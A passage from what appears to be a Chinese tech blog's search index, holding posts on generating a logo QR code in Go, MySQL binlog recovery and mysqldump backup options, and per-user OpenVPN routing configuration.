tabindex=\"0\"\u003e\u003ccode\u003evar sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime);\r\n\r\n// TODO: 在sortFiles中，获取最新的域名（文件名去掉.zip就是域名），结合logoUrl生成二维码，覆盖QRCodePath图片\r\n\r\n\r\n// TODO: 将QRCodePath图片上传到阿里云OOS根目录，重复则覆盖，\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e看了一下，觉得思路如下，这是个管道流，无论徒手写代码生成QRCODE(还有个logo图需要放到二维码中央)，还是集成OSS的SDK都麻烦\u003c/p\u003e\n\u003cp\u003e最快速方法是直接调用外部成程序做这两步，第一步用Go写个程序生成二维码，第二步用阿里的ossutil64工具上传\u003c/p\u003e\n\u003ch4 id=\"一go程序gen出qrcode\"\u003e一、Go程序Gen出QRCode\u003c/h4\u003e\n\u003cp\u003ego 有很多库，我们直接拿来用好了，但是基本上都是老代码，所以需要下载 go1.13.15 来用\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# 下载go 1.13.15，解压到E:\\go，并建立一个E:\\go\\go-work目录，下载的模块会放到这里\r\nhttps://dl.google.com/go/go1.13.15.windows-amd64.zip\r\n\r\n# 设置三个变量\r\nGOROOT=E:\\go\r\nGOPATH=E:\\go\\go-work\r\nPATH中增加好E:\\go\\bin的目录\r\n\r\n# 设置一下代理，有时候模块拉不下来\r\ngo env -w GOPROXY=https://goproxy.cn,direct\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后就准备gen qrcode的程序，main.go\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003epackage main\r\n\r\nimport (\r\n\t\u0026#34;flag\u0026#34;\r\n\t\u0026#34;image\u0026#34;\r\n\t\u0026#34;image/draw\u0026#34;\r\n\t\u0026#34;image/jpeg\u0026#34;\r\n\t_ \u0026#34;image/png\u0026#34;\r\n\t\u0026#34;os\u0026#34;\r\n\t\u0026#34;path/filepath\u0026#34;\r\n\r\n\t\u0026#34;github.com/LyricTian/logger\u0026#34;\r\n\t\u0026#34;github.com/nfnt/resize\u0026#34;\r\n\t\u0026#34;github.com/skip2/go-qrcode\u0026#34;\r\n)\r\n\r\nvar (\r\n\ttext    string\r\n\tlogo    string\r\n\tpercent int\r\n\tsize    int\r\n\tout     string\r\n)\r\n\r\nfunc init() {\r\n\tflag.StringVar(\u0026amp;text, \u0026#34;t\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;二维码内容\u0026#34;)\r\n\tflag.StringVar(\u0026amp;logo, \u0026#34;l\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;二维码Logo(png)\u0026#34;)\r\n\tflag.IntVar(\u0026amp;percent, \u0026#34;p\u0026#34;, 15, \u0026#34;二维码Logo的显示比例(默认15%)\u0026#34;)\r\n\tflag.IntVar(\u0026amp;size, \u0026#34;s\u0026#34;, 256, \u0026#34;二维码的大小(默认256)\u0026#34;)\r\n\tflag.StringVar(\u0026amp;out, \u0026#34;o\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;输出文件\u0026#34;)\r\n}\r\n\r\nfunc main() {\r\n\tflag.Parse()\r\n\r\n\tif text == \u0026#34;\u0026#34; {\r\n\t\tlogger.Fatalf(\u0026#34;请指定二维码的生成内容\u0026#34;)\r\n\t}\r\n\r\n\tif out == \u0026#34;\u0026#34; {\r\n\t\tlogger.Fatalf(\u0026#34;请指定输出文件\u0026#34;)\r\n\t}\r\n\r\n\tif exists, err := checkFile(out); err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;检查输出文件发生错误：%s\u0026#34;, err.Error())\r\n\t} else if exists {\r\n\t\tlogger.Fatalf(\u0026#34;输出文件已经存在，请重新指定\u0026#34;)\r\n\t}\r\n\r\n\tcode, err := qrcode.New(text, qrcode.Highest)\r\n\tif err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;创建二维码发生错误：%s\u0026#34;, err.Error())\r\n\t}\r\n\r\n\tsrcImage := code.Image(size)\r\n\tif logo != \u0026#34;\u0026#34; {\r\n\t\tlogoSize := float64(size) * float64(percent) / 100\r\n\r\n\t\tsrcImage, err = addLogo(srcImage, logo, int(logoSize))\r\n\t\tif err != nil {\r\n\t\t\tlogger.Fatalf(\u0026#34;增加Logo发生错误：%s\u0026#34;, err.Error())\r\n\t\t}\r\n\t}\r\n\r\n\toutAbs, err := filepath.Abs(out)\r\n\tif err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;获取输出文件绝对路径发生错误：%s\u0026#34;, err.Error())\r\n\t}\r\n\r\n\tos.MkdirAll(filepath.Dir(outAbs), 0777)\r\n\toutFile, err := os.Create(outAbs)\r\n\tif err != nil {\r\n\t\tlogger.Fatalf(\u0026#34;创建输出文件发生错误：%s\u0026#34;, err.Error())\r\n\t}\r\n\tdefer outFile.Close()\r\n\r\n\tjpeg.Encode(outFile, srcImage, \u0026amp;jpeg.Options{Quality: 100})\r\n\r\n\tlogger.Infof(\u0026#34;二维码生成成功，文件路径：%s\u0026#34;, outAbs)\r\n}\r\n\r\nfunc checkFile(name string) (bool, error) {\r\n\t_, err := os.Stat(name)\r\n\tif err != nil {\r\n\t\tif os.IsNotExist(err) {\r\n\t\t\treturn false, nil\r\n\t\t}\r\n\t\treturn false, err\r\n\t}\r\n\treturn true, nil\r\n}\r\n\r\nfunc resizeLogo(logo string, size uint) (image.Image, error) {\r\n\tfile, err := os.Open(logo)\r\n\tif err != nil {\r\n\t\treturn nil, err\r\n\t}\r\n\tdefer file.Close()\r\n\r\n\timg, _, err := image.Decode(file)\r\n\tif err != nil {\r\n\t\treturn nil, err\r\n\t}\r\n\r\n\timg = resize.Resize(size, size, img, resize.Lanczos3)\r\n\treturn img, nil\r\n}\r\n\r\nfunc addLogo(srcImage image.Image, logo string, size int) (image.Image, error) {\r\n\tlogoImage, err := resizeLogo(logo, uint(size))\r\n\tif err != nil {\r\n\t\treturn nil, err\r\n\t}\r\n\r\n\toffset := image.Pt((srcImage.Bounds().Dx()-logoImage.Bounds().Dx())/2, (srcImage.Bounds().Dy()-logoImage.Bounds().Dy())/2)\r\n\tb := srcImage.Bounds()\r\n\tm := image.NewNRGBA(b)\r\n\tdraw.Draw(m, b, srcImage, image.ZP, draw.Src)\r\n\tdraw.Draw(m, logoImage.Bounds().Add(offset), logoImage, image.ZP, draw.Over)\r\n\r\n\treturn m, nil\r\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面很简单，用到了别人的三个模块，需要安装一下\u003c/p\u003e","title":"Freelancer之QRCode"},{"content":"我们来说恢复的第二种情况，就是需要从binlog中指定位置恢复\nbinlog如何设置不说了，我们假设上次用mysqldump做过一次全量备份。\nmysqldump -uroot -p -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 -B 库名 \u0026gt; 库名.sql 由于我们在备份中使用了参数\u0026ndash;flush-logs \u0026ndash;master-data=2，所以 库名.sql 中会有binglog的信息供我们使用。\n一、用mysqlbinlog来恢复 我们首先要查到随后的binlog文件是那个，从那时候起又生成多少个binglog文件。\n然后去库里查询：\nshow master logs; show master status; 我们要分析一下SQL\n# show binlog events [IN \u0026#39;log_name\u0026#39;] [FROM pos] [LIMIT [offset,] row_count]; show binlog events in \u0026#39;javaboy_logbin.000002\u0026#39; limit 5,10; 我们来翻看日志：\n可以看到是从 764\u0026ndash;\u0026gt;865 ，发生了删除，那么回放到这个764这个position前即可，764不会执行\nmysqlbinlog /var/lib/mysql/mysql-bin.000204 --stop-position=764 --database=bbb | mysql -uroot -p \u0026ndash;start-position指定从哪里开始恢复，如果不指定，就会从binlog文件开头的position开始\nmysqlbinlog /var/lib/mysql/mysql-bin.000204 --start-position=205 --stop-position=764 --database=bbb | mysql -uroot -p 二、用binglog2sql来恢复 binlog2sql 是大众点评公司的DBA 开发的一款基于通过解析binlog将delete 恢复为insert,update 的值 set 字段和where条件做对调的原理来恢复数据的。 使用限制 MySQL的binlog format 必须是row 安装\n简单说它的道理就是变删为增，生成新的SQL执行。感觉 yearning 的回滚应该就是基于这个东西搞得。\n地址：https://github.com/danfengcao/binlog2sql\n解析出回滚的SQL：\npython binlog2sql.py --flashback -h127.0.0.1 -P3306 -uadmin -p\u0026#39;admin\u0026#39; -dtest -ttest3 --start-file=\u0026#39;mysql-bin.000002\u0026#39; --start-position=763 --stop-position=1147 \u0026gt; rollback.sql 回滚前务必再备份一下\nmysql -h127.0.0.1 -P3306 -uadmin -p \u0026lt; rollback.sql ","permalink":"https://rendoumi.com/posts/20221122-mysqldump_binlog/","summary":"\u003cp\u003e我们来说恢复的第二种情况，就是需要从binlog中指定位置恢复\u003c/p\u003e\n\u003cp\u003ebinlog如何设置不说了，我们假设上次用mysqldump做过一次全量备份。\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emysqldump -uroot -p  -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob  --single-transaction --flush-logs --master-data=2 -B 库名  \u0026gt; 库名.sql\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e由于我们在备份中使用了参数\u0026ndash;flush-logs \u0026ndash;master-data=2，所以 \u003cstrong\u003e库名.sql\u003c/strong\u003e 中会有binglog的信息供我们使用。\u003c/p\u003e\n\u003ch4 id=\"一用mysqlbinlog来恢复\"\u003e一、用mysqlbinlog来恢复\u003c/h4\u003e\n\u003cp\u003e我们首先要查到随后的binlog文件是那个，从那时候起又生成多少个binglog文件。\u003c/p\u003e\n\u003cp\u003e然后去库里查询：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow master logs\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow master status\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20221122194020751\" loading=\"lazy\" src=\"/posts/20221122-mysqldump_binlog/image-20221122194020751.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们要分析一下SQL\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# show binlog events [IN \u0026#39;log_name\u0026#39;] [FROM pos] [LIMIT [offset,] row_count];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshow binlog events in \u003cspan class=\"s1\"\u003e\u0026#39;javaboy_logbin.000002\u0026#39;\u003c/span\u003e limit 5,10\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们来翻看日志：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20221122194528219\" loading=\"lazy\" src=\"/posts/20221122-mysqldump_binlog/image-20221122194528219.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到是从 764\u0026ndash;\u0026gt;865 ，发生了删除，那么回放到这个764这个position前即可，764不会执行\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emysqlbinlog /var/lib/mysql/mysql-bin.000204 --stop-position=764 --database=bbb | mysql -uroot -p\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u0026ndash;start-position指定从哪里开始恢复，如果不指定，就会从binlog文件开头的position开始\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqlbinlog /var/lib/mysql/mysql-bin.000204 --start-position\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e205\u003c/span\u003e --stop-position\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e764\u003c/span\u003e --database\u003cspan class=\"o\"\u003e=\u003c/span\u003ebbb \u003cspan class=\"p\"\u003e|\u003c/span\u003e mysql -uroot -p\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"二用binglog2sql来恢复\"\u003e二、用binglog2sql来恢复\u003c/h4\u003e\n\u003cp\u003ebinlog2sql 是大众点评公司的DBA 开发的一款基于通过解析binlog将delete 恢复为insert,update 的值 set 字段和where条件做对调的原理来恢复数据的。 使用限制 MySQL的binlog format 必须是row 安装\u003c/p\u003e","title":"MySQL数据库的备份和恢复之二"},{"content":"喜大普奔，干了一个月的MySQL DBA的工作，又学到了一部分知识。\n记录一下，以备不时只需\nmysqldump 的备份其实很麻烦，要考虑很多因素\n备份时候不能锁表 恢复的时候要快 有二进制数据的话需要备份二进制数据 有触发器、存储过程的都备份 通常 mysqldump 是做每天的fullbackup，要为之后的 binlog 做好准备，万一要恢复要提前做好准备 我们一点一点来说：\n一、备份时不能锁表\n--single-transaction 通过将导出操作封装在一个事务内来使得导出的数据是一个一致性快照 该选项在导出数据之前提交一个BEGIN SQL语句，BEGIN不会阻塞任何应用程序且能保证导出时数据库的一致性状态。 它只适用于InnoDB存储引擎。 本选项和--lock-tables选项是互斥的，因为LOCK TABLES会使任何挂起的事务隐含提交。 二、恢复时要尽量快\n--opt 等同于--add-drop-table, --add-locks, --create-options, --quick, --extended-insert, --lock-tables, --set-charset, --disable-keys 该选项默认开启, 可以用--skip-opt禁用. --extended-insert, -e --extended-insert=false 使用具有多个VALUES列的INSERT语法。这样使导出文件更小，并加速导入时的速度。 默认为打开状态，使用--skip-extended-insert取消选项。 三、有二进制的按二进制备份\n--hex-blob 使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用该选项。影响到的字段类型有BINARY、VARBINARY、BLOB。 四、有触发器、存储过程的都备份\n--triggers 导出触发器。该选项默认启用，用--skip-triggers禁用它。 --routines, -R 导出存储过程以及自定义函数 五、为之后如果要做binlog恢复提前做好准备\n--flush-logs 开始导出之前刷新binlog日志。 请注意：假如一次导出多个数据库(使用选项--databases或者--all-databases)，将会逐个数据库刷新日志。 除非使用--lock-all-tables或者--master-data外。在这种情况下，日志将会被刷新一次，相应的所以表同时被锁定。 因此，如果打算同时导出和刷新日志应该使用--lock-all-tables 或者--master-data 和--flush-logs --master-data 在导出的时候同时生成binlog文件名和位置在导出的文件开头。 这个非常重要。binlog 的文件和位置可以从这里拿到。 例如： -- CHANGE MASTER TO MASTER_LOG_FILE=\u0026#39;binlog.000001\u0026#39;, MASTER_LOG_POS=157; 该选项将binlog的位置和文件名追加到输出文件中。 如果为1，将会输出CHANGE MASTER 命令； 如果为2，输出的CHANGE MASTER命令前添加注释信息。 该选项将打开--lock-all-tables 选项，除非--single-transaction也被指定（在这种情况下，全局读锁在开始导出时获得很短的时间；其他内容参考下面的--single-transaction选项）。 该选项自动关闭--lock-tables选项。 mysqldump -uroot -p --host=localhost --all-databases --master-data=1; mysqldump -uroot -p --host=localhost --all-databases --master-data=2; 那么综上所述，总结一行非常使用的备份语句：\nmysqldump -uroot -p -h 192.168.1.35 -P3306 --opt --triggers -R --hex-blob --single-transaction --flush-logs --master-data=2 -B 库名 \u0026gt; 库名.sql ","permalink":"https://rendoumi.com/posts/20221121-mysqldump/","summary":"\u003cp\u003e喜大普奔，干了一个月的MySQL DBA的工作，又学到了一部分知识。\u003c/p\u003e\n\u003cp\u003e记录一下，以备不时只需\u003c/p\u003e\n\u003cp\u003emysqldump 的备份其实很麻烦，要考虑很多因素\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e备份时候不能锁表\u003c/li\u003e\n\u003cli\u003e恢复的时候要快\u003c/li\u003e\n\u003cli\u003e有二进制数据的话需要备份二进制数据\u003c/li\u003e\n\u003cli\u003e有触发器、存储过程的都备份\u003c/li\u003e\n\u003cli\u003e通常 mysqldump 是做每天的fullbackup，要为之后的 binlog 做好准备，万一要恢复要提前做好准备\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e我们一点一点来说：\u003c/p\u003e\n\u003cp\u003e一、备份时不能锁表\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--single-transaction\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e通过将导出操作封装在一个事务内来使得导出的数据是一个一致性快照\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e该选项在导出数据之前提交一个BEGIN SQL语句，BEGIN不会阻塞任何应用程序且能保证导出时数据库的一致性状态。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e它只适用于InnoDB存储引擎。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e本选项和--lock-tables选项是互斥的，因为LOCK TABLES会使任何挂起的事务隐含提交。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、恢复时要尽量快\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--opt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e等同于--add-drop-table,  --add-locks, --create-options, --quick, --extended-insert, --lock-tables,  --set-charset, --disable-keys 该选项默认开启,  可以用--skip-opt禁用.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--extended-insert,  -e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--extended-insert\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e使用具有多个VALUES列的INSERT语法。这样使导出文件更小，并加速导入时的速度。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e默认为打开状态，使用--skip-extended-insert取消选项。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、有二进制的按二进制备份\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--hex-blob\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e使用十六进制格式导出二进制字符串字段。如果有二进制数据就必须使用该选项。影响到的字段类型有BINARY、VARBINARY、BLOB。\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e四、有触发器、存储过程的都备份\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--triggers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e导出触发器。该选项默认启用，用--skip-triggers禁用它。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--routines, -R\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e导出存储过程以及自定义函数\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e五、为之后如果要做binlog恢复提前做好准备\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--flush-logs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e开始导出之前刷新binlog日志。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e请注意：假如一次导出多个数据库\u003cspan class=\"o\"\u003e(\u003c/span\u003e使用选项--databases或者--all-databases\u003cspan class=\"o\"\u003e)\u003c/span\u003e，将会逐个数据库刷新日志。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e除非使用--lock-all-tables或者--master-data外。在这种情况下，日志将会被刷新一次，相应的所以表同时被锁定。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e因此，如果打算同时导出和刷新日志应该使用--lock-all-tables 或者--master-data 和--flush-logs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--master-data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e在导出的时候同时生成binlog文件名和位置在导出的文件开头。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e这个非常重要。binlog 的文件和位置可以从这里拿到。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e例如：\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-- CHANGE MASTER TO \u003cspan class=\"nv\"\u003eMASTER_LOG_FILE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;binlog.000001\u0026#39;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eMASTER_LOG_POS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e157\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e该选项将binlog的位置和文件名追加到输出文件中。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e如果为1，将会输出CHANGE MASTER 命令；\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e如果为2，输出的CHANGE  MASTER命令前添加注释信息。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e该选项将打开--lock-all-tables 选项，除非--single-transaction也被指定（在这种情况下，全局读锁在开始导出时获得很短的时间；其他内容参考下面的--single-transaction选项）。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e该选项自动关闭--lock-tables选项。\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqldump  -uroot -p --host\u003cspan class=\"o\"\u003e=\u003c/span\u003elocalhost --all-databases --master-data\u003cspan class=\"o\"\u003e=\u003c/span\u003e1\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysqldump  -uroot -p --host\u003cspan class=\"o\"\u003e=\u003c/span\u003elocalhost --all-databases --master-data\u003cspan class=\"o\"\u003e=\u003c/span\u003e2\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那么综上所述，总结一行非常使用的备份语句：\u003c/p\u003e","title":"MySQL数据库的备份和恢复之一"},{"content":"公司用的 OpenVPN ，研发部门和普通员工的权限不一样，技术部门需要访问服务器，普通员工则不需要\n这样的话就需要根据用户定制路由了，技术部门推送特定的路由，普通员工不推送。\n那么做法如下，在 server.conf 做如下设定：\nifconfig-pool-persist /etc/openvpn/conf/ipp.txt client-config-dir /etc/openvpn/conf/static 第一行是指定记录 ip 地址的文件，作用是如果服务器进程重启了，重启后会读取这个文件，客户端重新拨号后获得的 IP 就不会变，还是重启前的 IP。\n第二行是指定了客户端的单独配置\n我们假设一个用户是 zhangranrui，那么就去 /etc/openvpn/conf/static 下建立一个 zhangranrui 的文本文件，内容如下：\n# 前面是客户端固定IP地址，后面是网关地址\rifconfig-push 172.18.0.10 172.18.0.9\r# 推送路由，后面是掩码\rpush \u0026#34;route 10.10.0.0 255.255.0.0\u0026#34;\r# 重定向客户端的所有流量，否则访问服务端内网要像上面一样推送路由\r# push \u0026#34;redirect-gateway def1\u0026#34;\r# 推送给客户端的DNS解析地址\r# push \u0026#34;dhcp-option DNS 223.5.5.5\u0026#34;\r# push \u0026#34;dhcp-option DNS 114.114.114.114\u0026#34; 上面我们固定了IP，也推送了特定路由，那么怎么知道一个客户的 ip 呢，去看 ipp 文件：\ncat /etc/openvpn/conf/ipp.txt zhangranrui,172.18.0.8 注意，上面文件里的 172.18.0.8 不是 ip ，是 网段 地址\n172.18.0.9 是网关地址，172.18.0.10才是真正的 IP 地址，所以不要搞错了\n也可以针对用户推送一些其他选项。\n","permalink":"https://rendoumi.com/posts/20221119-openvpn_client/","summary":"\u003cp\u003e公司用的 OpenVPN ，研发部门和普通员工的权限不一样，技术部门需要访问服务器，普通员工则不需要\u003c/p\u003e\n\u003cp\u003e这样的话就需要根据用户定制路由了，技术部门推送特定的路由，普通员工不推送。\u003c/p\u003e\n\u003cp\u003e那么做法如下，在 server.conf 做如下设定：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eifconfig-pool-persist /etc/openvpn/conf/ipp.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eclient-config-dir /etc/openvpn/conf/static\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e第一行是指定记录 ip 地址的文件，作用是如果服务器进程重启了，重启后会读取这个文件，客户端重新拨号后获得的 IP 就不会变，还是重启前的 IP。\u003c/p\u003e\n\u003cp\u003e第二行是指定了客户端的单独配置\u003c/p\u003e\n\u003cp\u003e我们假设一个用户是 zhangranrui，那么就去 /etc/openvpn/conf/static 下建立一个 zhangranrui 的文本文件，内容如下：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e# 前面是客户端固定IP地址，后面是网关地址\r\nifconfig-push 172.18.0.10 172.18.0.9\r\n\r\n# 推送路由，后面是掩码\r\npush \u0026#34;route 10.10.0.0 255.255.0.0\u0026#34;\r\n\r\n# 重定向客户端的所有流量，否则访问服务端内网要像上面一样推送路由\r\n# push \u0026#34;redirect-gateway def1\u0026#34;\r\n\r\n# 推送给客户端的DNS解析地址\r\n# push \u0026#34;dhcp-option DNS 223.5.5.5\u0026#34;\r\n# push \u0026#34;dhcp-option DNS 114.114.114.114\u0026#34;\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面我们固定了IP，也推送了特定路由，那么怎么知道一个客户的 ip 呢，去看 ipp 文件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/openvpn/conf/ipp.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ezhangranrui,172.18.0.8\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意，上面文件里的 172.18.0.8 不是 ip ，是 \u003cstrong\u003e网段\u003c/strong\u003e 地址\u003c/p\u003e\n\u003cp\u003e172.18.0.9 是网关地址，172.18.0.10才是真正的 IP 地址，所以不要搞错了\u003c/p\u003e","title":"OpenVPN客户端定制IP和路由"},{"content":"面试 infosys 